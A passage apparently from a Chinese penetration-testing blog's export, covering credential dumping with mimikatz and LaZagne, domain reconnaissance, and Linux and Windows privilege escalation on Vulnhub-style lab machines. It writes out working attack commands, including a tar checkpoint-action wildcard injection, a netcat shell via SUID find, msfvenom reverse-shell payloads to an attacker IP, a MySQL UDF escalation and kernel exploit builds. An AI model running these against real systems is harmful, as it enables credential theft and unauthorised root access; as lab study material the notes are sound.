\n1、mimikatz：windows获取脚本\n直接在Webserver的webadmin用户运行会报错（mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够）\n执行：privilege::debug\n\n再执行：sekurlsa::logonpasswords\n\n\n会以明文形式返回各种关键信息。\n2、mimipenguin：linux获取以上信息的脚本。\n3、LaZagne(all)：通杀脚本，（windows，linux，mac）\n（不能直接点击运行会闪退，要在命令行里面运行）\n采用 all参数运行：\n\n\n4、XenArmor国外软件（$40-$50）\n下载地址：https://xenarmor.com/allinone-password-recovery-pro-software/（浏览器、WiFi、FTP的密码都可以发现）\n\n\n\n\n\n\n\n\n\n这两个软件主要是通过自动化翻找以下内容，从而获取凭据\n1.站点源码备份文件、数据库备份文件等\n2.各类数据库 Web 管理入口，如 PHPMyAdmin\n3.浏览器保存密码、浏览器 Cookies\n4.其他用户会话、3389 和 ipc$连接记录、回收站内容\n5.Windows 保存的 WIFI 密码\n6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等探针主机域控架构服务操作演示 \n0x02 探针主机域控架构服务操作演示为后续横向思路做准备，针对应用，协议等各类攻击手法\n###0x00\n1、探针域控制器名及地址信息：\nnet time &#x2F;domain\n nslookup ping\n2、探针域内存活主机及地址信息：\nnbtscan 192.168.3.0&#x2F;24 第三方工具（类似于nmup）\n下载地址：http://unixwiz.net/tools/nbtscan.html \n3、for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截）\n\n0x01NiShang简介1、利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。\n2、Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）\n0x02 NiShang使用powershell运行\n\n\n\n\n\n\n\n\n\n首先导入模块 ：Import-Module .\\nishang.psm1\n\n无法加载；\n\n\n\n\n\n\n\n\n\n设置执行策略：\nSet-ExecutionPolicy RemoteSigned\n\n\n\n\n\n\n\n\n\n\n导入模块：\nImport-Module .\\nishang.psm1\n\n\n\n\n\n\n\n\n\n\n获取模块 nishang 的命令函数：\nGet-Command -Module nishang （每个参数对应一个功能模块）\n\n\n其中就有Mimikatz模块；\n调用Invoke-Mimikatz的功能：\n\n\n\n\n\n\n\n\n\n端口扫描：查看目录对应文件有演示语法，其他同理 \nInvoke-PortScan -StartAddress 192.168.3.21 -EndAddress 192.168.3.31 -ResolveHost -ScanPort\n\n扫出来就会有：ip、主机名、开放端口（1433对应SQLserver数据库）\n除了口令攻击，还可以对服务进行攻击；\n\n\n\n\n\n\n\n\n\n其他功能：删除补丁，反弹 Shell，凭据获取等\n探针域内主机角色及服务信息\n利用开放端口服务及计算机名判断\n核心业务机器:\n1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机\n2.产品管理系统服务器\n3.办公系统服务器\n4.财务应用系统服务器\n5.核心产品源码服务器（自建 SVN、GIT）\n6.数据库服务器\n7.文件或网盘服务器、共享服务器\n8.电子邮件服务器\n9.网络监控系统服务器\n10.其他服务器（内部技术文档服务器、其他监控服务器等）\n","slug":"内网安全-域环境与工作组及局域网探针","date":"2022-06-26T02:00:33.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"94e89ed0a4dcaf9a831f6c95bed9331c","title":"权限提升-Linux提权2","content":"0x00 Linux 提权SUID配合环境变量本地提权0x00首先需要普通权限用户登录主机：\n上传demo.c文件至主机的普通用户文件夹：\n\n\n0x01\n\n\n\n\n\n\n\n\n使用以下命令编译demo.c文件，编译出shell文件：gcc demo.c -o shell\n\n0x02环境变量：一个命令对应执行的文件，比如输入：Java，可能执行的是一个路径下的文件。（Linux的命令都存放在&#x2F;bin、&#x2F;sbin目录下）：\n\n0x03sh是linux中运行shell的命令，是shell的解释器，shell脚本是linux中壳层与命令行界面，用户可以在shell脚本输入命令来执行各种各样的任务。\n执行.&#x2F;sh(等价于直接执行sh,环境变量的作用就是不用加路径)\n\n0x04\n\n\n\n\n\n\n\n\n执行以下命令：复制&#x2F;bin目录下的sh文件到&#x2F;tmp目录下的ps文件\ncp &#x2F;bin&#x2F;sh &#x2F;tmp&#x2F;ps\n\n\n这里直接执行ps输出进程信息，而执行.&#x2F;ps相当于执行的式&#x2F;bin目录下的sh文件，没有输出。\n0x05\n\n\n\n\n\n\n\n\n执行以下命令：\nexport PATH&#x3D;&#x2F;tmp:$PATH\n将&#x2F;tmp设置为环境变量（在原有的环境变量前面添加一个&#x2F;tmp，现在的ps应该就是.&#x2F;sh,输入的ps没有反应了。\n\n现在执行ps命令和之前执行.&#x2F;p返回结果相同：\n\n由于添加了&#x2F;tmp为环境变量，这是执行ps是执行的&#x2F;tmp文件下的ps文件，相当于执行的是&#x2F;bin目录下的sh文件，返回的是shell。\n0x06执行上传的demo.c文件：\n\n没有提权成功。\n查看ps是否又suid权限：\n以root给ps赋予suid权限：\n\n\n再次查看，ps有suid权限，但是&#x2F;user&#x2F;bin目录下：\n\n\n0x07参考了下文章：\n需要执行的命令顺序：\n\n\n\n\n\n\n\n\n\nlsgcc demo.c -o shellchmod u+s shellls -la shell\nfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null\n先使用root权限将编译好的shell文件提升至suid权限，下图中可以看到shell的权限为root：\n\n使用Find命令，搜索具有SUID或4000权限的文件。\n\n\n\n\n\n\n\n\n\nfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null\n\n可以看到shell文件。\n来到&#x2F;home&#x2F;user&#x2F;script目录下执行shell文件：\n\n$变为#，成功提权。\n0x08 总结原理分析：执行shell脚本会以uid(0)gid(0)（就是root）执行&#x2F;bin&#x2F;sh，但是字面显示的却是ps，只要ps命令拥有suid权限，同时shell文件也必须拥有SUID权限，就会以root执行demo脚本，进而执行sh进入一个shell界面。因此，必须配合SUID权限再进行环境变量提权。\n前提条件：\n1、执行的文件必须有SUID权限；\n2、本地用户\n之前没有成功就是因为shell文件没有suid权限，是user权限：\n###0x09\nLinux环境变量提权参考文章：\nhttps://blog.csdn.net/qq_50854790/article/details/120941341\n0x01 Linux 提权本地定时任务安全0x00 路径问题利用计划任务指向的文件的相对路径解析问题\n1、查看当前电脑的定时任务（m分钟，h小时，dom周，mon月）\n2、全部*****代表每一分钟执行一次\n3、SHELL变量指定了系统要使用哪个shell，这里是bash\n4、PATH变量指定了系统执行命令的路径，user是以root权限运行\n\n0x01先以root权限天年假一个计划任务，每分钟执行一次，并且不写绝对路径：\n\n\n\n\n\n\n\n\n\ncrontab -e编辑计划任务\ncrontab -l查看计划任务\n\n0x02计划任务test.sh文件默认会在&#x2F;usr&#x2F;local&#x2F;bin路径下执行，先将test.sh文件上传至默认路径&#x2F;usr&#x2F;local&#x2F;bin，创建文件将日期写入time.log：\n\n赋予test.sh执行权限：\n0x03没有复现成功，简述一下思路和过程：\n之后，等待一会，查看&#x2F;tmp目录会出现time.log文件，再切换用户，在当前用户目录下创建test.sh，将&#x2F;bin目录下的bash命令（一种shell）移动到临时目录，并且给予suid权限(当前用户、用户组、其它用户都有suid权限)，给予test.sh执行权限，继续&#x2F;tmp目录下查看是否生成bush文件，若生成执行bush文件即可提权。\n0x04 命令安全（WS注入）利用通配符配合命令参数自定义命令实现提权\n先创建backup.sh文件上传至&#x2F;home&#x2F;user&#x2F;script目录下：\n（使用cd切换到&#x2F;home&#x2F;user&#x2F;script&#x2F;并且使用tar czf命令压缩为&#x2F;tmp&#x2F;backup.tar.gz文件）\n\n\n把script的文件夹里面的所有文件打包好至&#x2F;tmp目录下。\n原理：进入.pip目录下，备份*（所有文件）到&#x2F;tmp目录下为：backup.tar.gz\n参数czf的含义：&#x2F;将目录里所有文件打包成.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为backup.tar.gz\n查看&#x2F;tmp目录，生成了备份文件：\n\n\n0x05切换用户，在&#x2F;home&#x2F;user&#x2F;script目录下(要打包压缩的目录)创建三个文件：\n\n\n\n\n\n\n\n\n\necho ‘cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash; chmod +s &#x2F;tmp&#x2F;bash’ &gt; &#x2F;home&#x2F;user&#x2F;script&#x2F;test.sh\necho “” &gt; “–checkpoint-action&#x3D;exec&#x3D;sh test.sh”\necho “” &gt; –checkpoint&#x3D;1\n\n\n进入到&#x2F;tmp目录下看到出现bush文件：\n\n0x06打开backup.tar.gz发现只有两个文件（–checkpoint-action&#x3D;exec&#x3D;sh test.sh和–checkpoint&#x3D;1不见了）：\n\n\n定时任务打包是将整个文件夹下的文件打包，而当系统真正执行打包操作时，会将目录下的所有文件名一个一个传参给*执行打包操作。前几个文件都没问题正常打包，但是当打包到–checkpoint&#x3D;1文件和–checkpoint-action&#x3D;exec&#x3D;sh test.sh文件时，执行的相当于：\ntar czf &#x2F;tmp&#x2F;backup.tar.gz --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;sh test.sh\n\ncheckpoint、–checkpoint-action正好是tar命令的参数，打印进度\n\ncheckpoint-action&#x3D;exec&#x3D;sh test.sh相当于执行sh,从输入流调用shell，然后再sh里面执行test.sh,而test.sh是将bash复制到&#x2F;tmp目录，因此这里的bash有suid权限：\ntar命令参考文章：\nhttps://www.cnblogs.com/manong--/p/8012324.html\n0x07使用本地用户提权：\n执行：.&#x2F;bash -p\n\n\nroot权限，成功提权。\n0x08 命令问题总结1、有可操作的命令\n2、命令中有*（通配符）\n0x09 权限问题利用不安全的权限分配操作导致的定时文件覆盖\n漏洞成因：管理员正常创建一个文件test.sh时，默认是没有执行权限的，此时管理员若想执行这文件，必须给它赋执行权限，正常的赋权命令是chmod +x test.sh（所有人都可以执行，更安全的是只有创建用户可以执行：chmod u+x test.sh），这样就可以执行test.sh。\n并且组和其他成员无法修改覆盖这个文件（即写权限），但是粗心的管理员会直接chmod 777 test.sh，这样虽然也可以实现执行test.sh的目的，但是会导致权限扩大，即组和其他成员都可以对文件修改覆盖，造成风险（写权限风险最大）。\n0x10创建check.sh文件上传至&#x2F;home&#x2F;user目录下，并设置权限为777：\n\n\n0x11切换用户，以普通用户登录时也可以拥有check.sh的读写执行权限，这个时候就可以重复命令问题（WS注入）写入提权命令进行提权。（也就是进行重写覆盖）\n\n\n\n\n\n\n\n\n\n可以使用查看权限的命令查看那些文件拥有写入权限：ls -al &#x2F;home&#x2F;user\n\n判断出那些文件拥有写入权限进行重写覆盖提权。\n0x02 Linux数据库提权-Vulnhub-Raven20x00靶机：Vulnhub-Raven2\n攻击机：Kali\n攻击流程：探针 IP 及端口-利用漏洞获取 web 权限-信息收集-查看数据库配置文件-利用 Mysql 提 \n权 Linux（Mysql 版本区别同 Windows） \n0x01\n\n\n\n\n\n\n\n\nnmap扫描网段：nmap  x.x.x.0&#x2F;24\n\n有一个ip开放web服务，打开看看：\n\n\n底部有Colorlib字样，应该是cms：\n\n搜一下，不是cms：\n\n0x02没其他思路，扫一下目录，使用Kali自带的dirb：\n\n\n\n警告说：vendor目录是列举的，不需要去扫描，猜测应该存在目录遍历漏洞，访问这个目录试试。\n0x03果真是个目录遍历：\n\n\n还是Linux服务器。\n0x04打开一个一个看，在PATH目录发现了第一个flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;\n\n还给得到了网站绝对路径。\n打开README.md文件，看到有一个PHPMailer服务：\n\n打开VERSION目录是版本号，推测是PHPMailer的版本\n\n0x05百度一下PHPMailer的漏洞：\n\n有很多；利用msf搜索可利用漏洞：\n\n网上师傅们都选择40974这个，将exp拷贝到当前目录；\n命令：cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;40974.py .\n\n修改一些40974.py的一些参数：\n头部加上：\n#!&#x2F;usr&#x2F;bin&#x2F;python\n# -*- coding: utf-8 -*-\n\n\ntarget要改成靶机的地址\nbackdoor就是后门文件，要和最后一个框里的名称对应\n第二个ip是攻击机IP和对应端口\n最后一个框的路径和名称要改一下，不能用默认的\n\n最后执行：\n\n\n\n\n\n\n\n\n\npython 40974.py\n\n0x06访问http://192.168.216.152/contact.php，会自动生成一个nide.php后门文件：\n\n\n访问后门文件：\n\n开启监听，返回shell：\n\n继续使用python获取pty：\n\n\n\n\n\n\n\n\n\npython -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’\n\n\n第二个flag：flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;\n\n0x07\n\n\n\n\n\n\n\n\n使用find查找一下：find -name flag*\n\nflag3是个图片：flag3.png；无法直接在命令行中查看。但是该图片在网站目录下，因此可以直接访问网站路径即可查看图片内容\n\n\n0x08最后一个flag4需要提权。\n查看网站根目录：\n进入wordpress文件夹里，发现其配置文件：\n查看wp-config.php的内容，发现了网站的mysql数据库wordpress，以及mysql的root密码R@v3nSecurity：\n###0x09\n利用获取到的账号密码，登录mysql\n\n\n\n\n\n\n\n\n\nmysql -u root -pR@v3nSecurity\n本来可以直接使用Kali连接数据库，连了很长时间没有反应，也不弹出mysql命令框：\n上传一句话使用蚁剑连接：\n\n进入 &#x2F;tmp目录上传脚本，赋予权限后执行：\n!\n搜集到mysql数据库版本为5.5.6，可以使用UDF提权。\n（上一步为了连接数据库也是为了查看版本信息）\n\n0x10使用searchsploit mysql 命令找到利用exp：\n\nUDF提权，1518.c\n把该文件复制出来，在kali上进行编译生成so文件：\n\n\n\n\n\n\n\n\n\ncp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c .&#x2F;gcc -g -c 1518.cgcc -g -shared -o  raptor_udf.so 1518.o -lc\n\n0x11\n\n\n\n\n\n\n\n\n在kali上起一个web服务，将生成的so文件提供给靶机下载\npython -m SimpleHTTPServer 8888\n\n\n\n\n\n\n\n\n\n在受害靶机上切换到tmp目录下，wget下载编译好的so文件\ncd &#x2F;tmpwget http://192.168.216.150:8888/raptor_udf.so\n\n拒绝连接。\n将编译好的raptor_udf.so文件使用蚁剑上传至受害机&#x2F;tmp目录：\n\n将raptor_udf.so文件重命名为1518.so文件：\n0x12环境崩了，简述一下后续过程：\n之后进入数据库创建表foo，向表中插入二进制数据，然后利用dumpfile函数把文件导出， 再新建存储函数do_system类型是integer，别名（soname）文件名字\n\n\n\n\n\n\n\n\n\nmysql -u root -pR@v3nSecurityuse mysql;create table foo(line blob);insert into foo values(load_file(‘&#x2F;tmp&#x2F;raptor_udf.so’));select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;raptor_udf.so’;create function do_system returns integer soname ‘raptor_udf.so’;select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;raptor_udf.so’;create function do_system returns integer soname ‘raptor_udf.so’;\n通过do_system函数给find命令所有者的suid权限，使其可以执行root权限的命令\n\n\n\n\n\n\n\n\n\nselect do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);\n\n\n\n\n\n\n\n\n\n\ntouch finnfind finn -exec “bin&#x2F;sh” ;\n\n使用find执行 shell，最后找到flag4\n\n\n\n\n\n\n\n\n\nfind &#x2F;root -name flag*\n\n0x13 总结需要利用数据库将UDF进行导出的原因：\n只有借助MySQL才有root权限，才能刚1518.so导入到&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;1518.so（普通用户没有这个权限），也只有mysql的才能够赋予用户suid权限。\n0x03  Linux 提权简单总结归类1.提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)\n2.最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)\n3.本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）\n4.其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)\nSUDO 说明参考：https://www.freebuf.com/vuls/217089.html\nexploitdb 站点：https://www.exploit-db.com/\nLinux漏洞库：https://github.com/offensive-security/exploitdb \n","slug":"权限提升-Linux提权2","date":"2022-06-25T01:38:59.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"fcd910c24ec5aac777084d6a38361ecb","title":"权限提升-Linux提权1","content":"0x00脑图：\n0x01 信息收集LinEnum、linuxprivchecker脚本0x00 LinEnum需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。\n（tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权限不够导致上传失败或者执行不了，linux提权优先上传tmp目录）\n来到“tmp”目录下\ncd /tmp\n\n如果文件不能被执行，给予其一个可执行权限\nchmod +x LinEnum.sh\n\nchmod +x [文件名]\n\n\n执行文件\n./LinEnum.sh\n\n./[文件名]\n\n\n通过信息搜集可以查看是否窜在SUID提权的可能，或者可以利用的其他信息。\n0x01 linuxprivchecker需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python环境。\n来到“tmp”目录下，执行文件\npython linuxprivchecker.py\n\nlinuxprivchecker会列出目标机器的信息。\n\n由于是python脚本，靶机没有安装python环境，导致执行不了。命令执行如图。\n0x02 漏洞探针linux-exploit-suggester1-2脚本0x00 linux-exploit-suggester需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下\n来到“tmp”目录下，执行文件\n./linux-exploit-suggester.sh\n\nlinux-exploit-suggester首先会输出内核等信息，然后输出可能存在的漏洞，包括exp的下载地址，可以下载对应的exp来测试。\n0x01 linux-exploit-suggester2需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl环境\n来到“tmp”目录下，执行文件\nperl linux-exploit-suggester-2.pl\n\nlinux-exploit-suggester2会直接报告可能的漏洞和exp下载地址。\n\n0x03 SUID###0x00 介绍\nSUID (Set UID)是Linux中的一种特殊权限,其功能是用户在运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件。\n    在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.，利用此特性,我们可通过SUID进行提权。\n\n0x01 设置和取消SUID\n\n\n\n\n\n\n\n\n查看可执行文件是否有suid权限：ls -alh 文件名\n\n\n\n\n\n\n\n\n\n设置suid权限：\nchmod u+s 可执行文件\n\n\n\n\n\n\n\n\n\n取消suid权限：\nchmod u-s 可执行文件\n0x04  SUID进行Linux提权0x00利用LinEnum.sh搜集SUID相关信息：\n\n寻找这几个关键字具有SUID权限的二进制可执行文件提权：\nNmap，Vim，find，Bash，More，Less，Nano，cp\n\n或者利用手工探针：\n原理：这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。\nfind &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null\nfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null （适用Ubuntu）\nfind &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \n\n\n可以看到没有可利用的文件。\n0x01将&#x2F;usr&#x2F;bin目录下，将find文件以root赋予suid权限：\n\n再利用手工探针：\n可以看到有find文件。\n0x02（没有环境，搭建失败了）\n之后使用冰蝎连接，然后利用MSF连接冰蝎反弹的shell；\n再执行以下命令：\ntouch test\n-find test -exec whoami \\; #查看返回的当前权限；（原理：find test文件，并且以find文件的权限执行：whoami命令，如果find是suid,普通用户执行find命令也会获得root权限，再执行whoami就是root）\nfind test -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \\; #nc(netcat) 反弹 shell\n\n\n\n0x03参考文章：https://pentestlab.blog/2017/09/25/suid-executables/\n0x05 Linux本地内核漏洞提权0x00靶机：墨者学院 Ubuntu 16.04漏洞复现(CVE-2017-16995)\n0x01先使用ssh连接靶机：\n\n\n\n\n\n\n\n\n\nssh -p 端口号 linux服务器用户名@linux服务器ip地址\n\n查看id，普通用户\n\n\n\n\n\n\n\n\n\n1、ID&#x3D;0当 UID 是 0 时，代表这个账号是『系统管理员』！当你要创建一个账户为另一个系统管理员账号时， 你可以将该账号的 UID 改成 0 即可；这也就是说，一部系统上面的系统管理员不一定只有 root ！ 但强烈建议避免多个账号的 UID 配置为 0 。\n2、ID&#x3D;1499（系统使用）该范围内的用户id是保留给系统使用的 ID，其实 165534 之间的账号并没有不同， 也就是除了 0 之外，其它的 UID 并没有不一样，预设 500 以下给系统作为保留账号只是一个习惯。这样的好处是，以有名的 DNS 服务器的启动服务『 named 』为例，这个程序的预设所有人 named 的账号 UID 是 25 ，当你自定义的账号也是 25 时，会造成系统冲突！为了杜绝这样的问题，养成好习惯，保留 500 以前的 UID 给系统使用！\n注： 一般来说， 1到99 会保留给系统预设的账号，另外 100~499 则保留给一些服务来使用。\n3、ID&#x3D;500~65535 给一般使用者用的。\n0x02上传漏洞探针脚本进行检测：\n\n\n可以看到探测出三个可利用漏洞；CVE-2017-16995也存在。\n0x03下载CVE-2017-16995EXP：\n\n将45010.c文件上传至靶机：\n0x04由于c文件，需要编译运行：\n执行文件发现权限不够，修改权限：\n\n\n\n\n\n\n\n\n\nchomd +x 45010.c\n\n\n\n\n\n\n\n\n\n\n使用以下命令先编译：gcc 45010.c -o 45010\n再执行：\n.&#x2F;45010\n\n0x05查看当前权限：\n\n可以看到成功提权。\n0x06这个时候访问root目录下的key.txt文件得到key值：\n0x06 脏牛Linux内核提权0x00靶机：vulnhub-Lampiao\n攻击机：Kali\n0x01namp扫一下网段：\nnmap x.x.x.0&#x2F;24\n\n\n\n可以看到192.168.216.151这个主机存在80端口。\n0x02访问这个web服务：\n\n\n没有什么关键信息。\n0x03再使用nmap针对这个主机扫描所有端口：\nnmap -p1-65535 192.168.216.151\n\n\n又扫到一个1898端口开放的服务，直接访问。\n0x04\n\n是一个web服务。\n\n页底有一个Powered by Drupal，猜测是一个cms，网上直接搜。\n0x05\n0x06这里直接使用MSF搜索相关漏洞：\n\n直接使用2018年最新的exploit进行漏洞利用，设置攻击ip和对应端口，\n（2019年漏洞显示normal不可利用）\n\n0x07返回会话成功：\n0x08查看权限为普通权限：\n\n使用漏洞探针脚本上传到靶机进行探针：\n\n可以看到没有执行权限，添加权限后执行脚本：\n\n这里没有给出脏牛漏洞。\n直接下载脏牛漏洞：\n\n\n\n\n\n\n\n\n\n下载地址：http://www.exploit-db.com/download/40611\n\n这里下载完是一个文件，不是c文件，需要重命名或者从本地上传至靶机。\n0x09本地下载好40611.cpp文件上传至靶机：\n0x10\n\n\n\n\n\n\n\n\n使用以下命令编译：g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40611.cpp -lutil\n\n编译出dcow这个文件。\n0x11这里漏洞若要利用必须开一个模拟终端，这是漏洞成因造成的。因为产生一个交互式shell，就比如shell输入密码需要交互是一个道理。这里使用python产生一个伪终端。\n\n\n\n\n\n\n\n\n\n产生交互式命令：python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’\n\n这里获取到了root的密码（不是真正的修改，而是临时copy的一个root权限 )。\n0x12root登录在&#x2F;root目录下获取flag(这里可以以root创建一个新用户，加入root用户组，然后登录靶机) \n\n","slug":"权限提升-Linux提权1","date":"2022-06-23T01:10:48.000Z","categories_index":"权限提升","tags_index":"权限提升","author_index":"Aurora"},{"id":"c0a50503f3bb03b0879376d7c8e571c3","title":"权限提升-windows提权2","content":"0x00 RottenPotato(烂土豆)配合令牌窃取提权0x00 原理1.欺骗“NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。\n2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。\n3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。\n总结：一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。\n0x01 烂土豆比热土豆的优点1.100%可靠\n2.（当时）全版本通杀\n3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用\n总之，烂土豆是通过中间人攻击，将COM(NT\\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。\n0x02 适用范围1、本地提权，只针对本地用户。\n2、适用于win7、8、10、2008、2012\n0x03流程：上传烂土豆-执行烂土豆-利用窃取模块-窃取 SYSTEM-成功\n（前提：已经获得webshell权限）\n使用msf生成一个后门：\n\n\n\n\n\n\n\n\n\n格式：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D; LPORT&#x3D; -f exe &gt; 路径&#x2F;shell.exe\n命令：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.150 lport&#x3D;5588 -f exe -o &#x2F;home&#x2F;xiaobai&#x2F;payload.exe\n\n\n0x04此时的权限是iusr：\n使用蚁剑将后门传上去：\n\n0x05配置msf监听会话：\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\n\n\n0x06找到后门文件：\n利用webshell执行后门文件：\n0x07msf监听到ip:\n\n查看权限：\n低权限。\n0x08上传烂土豆：\n运行：（要在msf上运行烂土豆）\n\n\n（这里不能单纯使用令牌窃取，令牌窃取需要足够的权限，管理员权限）\n0x09查看权限，还是iusr：\n\n0x10使用令牌窃取：\n\n（警告信息我们得知无法正常假冒用户，所以令牌假冒失败。）\n正常假冒用户列表如下：\n\n0x11得到系统权限：\n（具体的流程就是以上这样，使用烂土豆配合令牌窃取提权）\nwindows内核EXP：\nhttps://github.com/SecWiki/windows-kernel-exploits\n0x01 DLL劫持配合令牌窃取提权0x00 原理DLL劫持指的是，病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。\n如下图，LPK.dll是应用程序运行所需加载的DLL，该系统文件默认在C:\\Windows\\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。\n\n###0x01 DLL劫持前提条件\n1、有权限替换dll文件\n2、有第三方软件\n3、管理员必须运行此第三方软件\n0x02流程：信息收集（服务器上的第三方程序的信息）-进程调试（分析这个程序在运行的时候调用了那些dll）-制作 dll 并上传(制作后门dll去替换原有的dll)-替换 dll-启动应用后成功\n下载带有dll文件的第三方软件：\n下载火绒剑：\n：https://www.jb51.net/softs/490503.html \n\n0x03运行程序，使用火绒剑分析调用了那些dll文件：\n\n这里只有一个数字签名文件，还是在c盘下；所有的dll文件都是在c盘windows下运行，导致没有权限替换dll文件。\n0x04思路：已经拿到了webshell权限，利用webshell权限上传能够替换的dll文件（这里的dll文件利用msf生成），之后利用msf监听IP端口，接着重新启动第三方软件，就会调用被替换的dll后门文件，msf监听到ip，再配合令牌窃取拿到系统权限。这就是利用dll劫持提权。\n（上图中所有的dll文件都在c盘windows目录下，webshell权限太低，无法上传到对应替换dll文件的目录下，就无法替换dll文件，一般要找运行第三方软件的目录或者有权限上传的目录，之后再进行dll文件替换）\n0x05应用程序加载的目录\n2、C:\\Windows\\System32\n3、C:\\Windows\\System\n4、C:\\Windows\n0x02 不带引号服务路径配合MSF本地提权0x00 原理当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。\n0x01不加引号：C:\\Program Files\\phpstudy_pro\\COM\\phpStudyServer.exe\n\n由于没加引号，这里的C:\\Program Files里的空格相当于截断了路径，如果在C盘有一个C:\\Program.exe系统就会优先运行它。\n加引号：”C:\\Program Files\\phpstudy_pro\\COM\\phpStudyServer.exe”\n\n可以看到两种情况返回的结果不一样。\n0x02过程:检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功\n查看有哪些不带引号的服务：\n\n\n\n\n\n\n\n\n\n命令：wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\\Windows\\“ | findstr &#x2F;i &#x2F;v “””\n\n\n列出很多不带引号的服务，筛选了所有的服务，没有一个文件名带有空格；因此无法利用。\n0x03类似下图的带空格的目录才可利用：\n0x04利用msf生成特殊目录的exe文件：Program.exe\n\n之后利用webshell上传到c盘。\n0x05启动服务就会调用这个Program.exe这个木马文件，利用msf监听ip获取权限：\n0x03 不安全的服务权限配置提权-本地权限0x00 原理即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 过程:检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功\n0x01创建一个服务：\nsc create NewServiceName 